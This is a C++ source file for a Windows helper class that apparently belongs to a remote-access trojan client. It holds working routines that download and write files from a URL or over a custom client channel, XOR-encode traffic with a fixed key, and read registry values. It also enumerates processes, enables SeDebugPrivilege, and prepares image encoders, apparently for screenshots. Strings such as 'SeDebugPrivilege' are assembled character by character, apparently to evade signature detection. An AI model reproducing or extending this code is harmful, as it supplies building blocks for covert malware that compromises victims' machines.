// MyMainFunc.cpp: implementation of the MyMainFunc class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyMainFunc.h"
#include "lzw.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


MyMainFunc::MyMainFunc()
{

}

MyMainFunc::~MyMainFunc()
{

}

BOOL MyMainFunc::GetUrlFile(char* pUrlPath, char* m_FilePath)
{
	//初始化HTTP环境
	HINTERNET hIe = InternetOpen("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if(!hIe) 
	{
		return FALSE;
	}

	//建立HTTP连接,上送数据
	HINTERNET hFp = InternetOpenUrl(hIe, pUrlPath, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_RELOAD, 0);
	if(!hFp)
	{
		InternetCloseHandle(hIe);
		return FALSE; 
	}

	//200
	char m_TempStr[256] = {0};
	m_TempStr[0] = '2';
	m_TempStr[1] = '0';
	m_TempStr[2] = '0';
	m_TempStr[3] = 0x00;

	//查看返回码
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!HttpQueryInfo(hFp, HTTP_QUERY_STATUS_CODE, sCode, &nSize, &nIndex) || lstrcmp(sCode, m_TempStr))
	{
		InternetCloseHandle(hFp);
		InternetCloseHandle(hIe);
		return FALSE;
	}

	HANDLE hFile = CreateFile(m_FilePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		InternetCloseHandle(hFp);
		InternetCloseHandle(hIe);
		return FALSE;
	}
	
	BOOL bIsSuccess = FALSE;
	BYTE  pDatabuf[4096];
	DWORD dwNumberOfBytesReaded = 0;
	DWORD nWriteLen = 0;
	while(1)
	{
		if(!InternetReadFile(hFp, pDatabuf, 4000, &dwNumberOfBytesReaded))
		{
			break;
		}

		if(dwNumberOfBytesReaded == 0)
		{
			bIsSuccess = TRUE; 
			break;
		}
		else
		{
			WriteFile(hFile, pDatabuf, dwNumberOfBytesReaded, &nWriteLen, NULL);
		}
	}

	CloseHandle(hFile);
	InternetCloseHandle(hFp);
	InternetCloseHandle(hIe);
	return bIsSuccess;
}

BOOL MyMainFunc::GetMyFile(char* pFileName, DWORD nCmd, PSDLLINFO m_Info)
{
	char m_GdiFilePath[MAX_PATH] = {0};
	char* m_GdiTmp = NULL;
	DWORD nGdiFileNameLen = SearchPath(NULL, pFileName, NULL, 1024, m_GdiFilePath, &m_GdiTmp);
	if(nGdiFileNameLen != 0)
	{
		return TRUE;
	}
	
	CMyClientTran m_Tran;
	if(!m_Tran.Create(nCmd, m_Info))
	{
		return FALSE;
	}

	BYTE* pData = NULL;
	DWORD dLen = 0;
	if(!m_Tran.RecvDataWithCmd(&pData, &dLen, &nCmd))
	{
		m_Tran.Close();
		return FALSE;
	}
	
	MyMainFunc::MyWriteFile(pFileName, pData, dLen);
	delete [] pData;
	return TRUE;
}

void MyMainFunc::EncryptByte(LPVOID pData, DWORD nLen)
{
	BYTE* pTmpData = (BYTE*) pData;
	for(DWORD i = 0; i < nLen; i++)
	{
		pTmpData[i] = pTmpData[i] ^ PS_ENTRY_COMM_KEY;	
	}
}

BOOL MyMainFunc::GetStrValue(LPCTSTR pStr, LPCTSTR pName, LPTSTR pValue)
{
	char m_Str[MAX_PATH] = {0};
	char m_Name[MAX_PATH] = {0};
	char m_Value[MAX_PATH] = {0};
	wsprintf(m_Name, "%s=", pName);
	lstrcpy(m_Str, pStr);

	char* pStart = StrStr(m_Str, pName);
	if(pStart == NULL)
	{
		return FALSE;
	}
	pStart += lstrlen(m_Name);
	
	char* pEnd = StrChr(pStart, ';');
	if(pEnd == NULL)
	{
		pEnd = m_Str + lstrlen(m_Str);
	}
	CopyMemory(pValue, pStart, (pEnd - pStart) * sizeof(char));
	pValue[pEnd - pStart] = 0;
	return TRUE;
}

BOOL MyMainFunc::MyGetKeyStr(HKEY hKey, LPCTSTR Title, LPCTSTR KeyName, BYTE* KeyValue)
{
	HKEY m_key = NULL;
	long ret = RegOpenKeyEx (	hKey,
								Title,
								0,
								KEY_ALL_ACCESS,
								&m_key
							 );
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}

	BYTE m_KeyValue[MAX_PATH] = {0};
	DWORD len = MAX_PATH;
	ret = RegQueryValueEx(	m_key,
							KeyName,
							0,
							NULL,
							m_KeyValue,
							&len
						);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		return FALSE;
	}
	CopyMemory(KeyValue, m_KeyValue, len);
	ret = RegCloseKey(m_key);
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	return TRUE;
}

void MyMainFunc::GetMoudleMame(DWORD pId, char* pExeName)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
    if(NULL == hProcess) 
	{
		return;
	}
	char m_ExeName[MAX_PATH] = {0};
	if(GetModuleFileNameEx(hProcess, NULL, m_ExeName, 1024) > 0)
	{
		lstrcpy(pExeName, m_ExeName);
	}
    CloseHandle(hProcess);
}

void MyMainFunc::GetMyToken()
{
	//SeDebugPrivilege
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'S';
	m_TempStr[1] = 'e';
	m_TempStr[2] = 'D';
	m_TempStr[3] = 'e';
	m_TempStr[4] = 'b';
	m_TempStr[5] = 'u';
	m_TempStr[6] = 'g';
	m_TempStr[7] = 'P';
	m_TempStr[8] = 'r';
	m_TempStr[9] = 'i';
	m_TempStr[10] = 'v';
	m_TempStr[11] = 'i';
	m_TempStr[12] = 'l';
	m_TempStr[13] = 'e';
	m_TempStr[14] = 'g';
	m_TempStr[15] = 'e';
	m_TempStr[16] = 0x00;

	// 给枚举的进程增加SE_DEBUG_NAME权限即可：
	HANDLE hToken;              // handle to process token 
	TOKEN_PRIVILEGES tkp;       // pointer to token structure 
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	LookupPrivilegeValue(NULL, m_TempStr, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 
}

void MyMainFunc::BcdToAsc(BYTE* BcdStr, BYTE* AscStr, int Bcdlstrlen)
{
	int i, j;
	for(i = 0; i < Bcdlstrlen; i++)
	{
		j = (BcdStr[i] >> 4) & 0x0f;
                
		if(j > 9)
		{
			AscStr[2 * i] = j + 'A' - 10;
		}
		else
		{
			AscStr[2 * i] = j + '0';
		}

		j = BcdStr[i] & 0x0f;

		if(j > 9)
		{
			AscStr[2 * i + 1 ] = j + 'A' - 10;
		}
		else
		{
			AscStr[2 * i + 1] = j + '0';
		}
	}
}

BOOL MyMainFunc::MyReadFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	HANDLE hFile = CreateFile(
			m_FileName,  
			GENERIC_READ,   
			FILE_SHARE_READ, 
			NULL,           
			OPEN_EXISTING,      
			FILE_ATTRIBUTE_NORMAL, 
			NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	ReadFile(hFile, pData, nLen, &nReadLen, NULL);
	CloseHandle(hFile);
	return TRUE;
}

BOOL MyMainFunc::MyWriteFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	DeleteFile(m_FileName);
	HANDLE hFile = CreateFile(
		m_FileName,  
		GENERIC_WRITE,   
		0, 
		NULL,           
		CREATE_NEW,      
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nWriteLen = 0;
	WriteFile(hFile, pData, nLen, &nWriteLen, NULL);
	CloseHandle(hFile);
	return TRUE;
}

BOOL MyMainFunc::IsProcessExit(DWORD nProcessId)
{
	DWORD*	pProcessId = new DWORD[1024];
	DWORD	nProcessCount = 0;
	if(EnumProcesses(pProcessId, sizeof(DWORD) * 1024, &nProcessCount))
	{
		for(DWORD i = 0; i < nProcessCount; i++)
		{
			if(pProcessId[i] == nProcessId)
			{
				delete [] pProcessId;
				return FALSE;
			}
		}
	}
	delete [] pProcessId;
	return TRUE;
}

int MyMainFunc::GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT  num = 0;          
	UINT  size = 0;   
	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if(size == 0)
	{
		return -1;
	}

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if(pImageCodecInfo == NULL)
	{
		return -1;
	}

	GetImageEncoders(num, size, pImageCodecInfo);
	for(UINT j = 0; j < num; ++j)
	{
		if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}    
	}
	free(pImageCodecInfo);
	return -1;
}

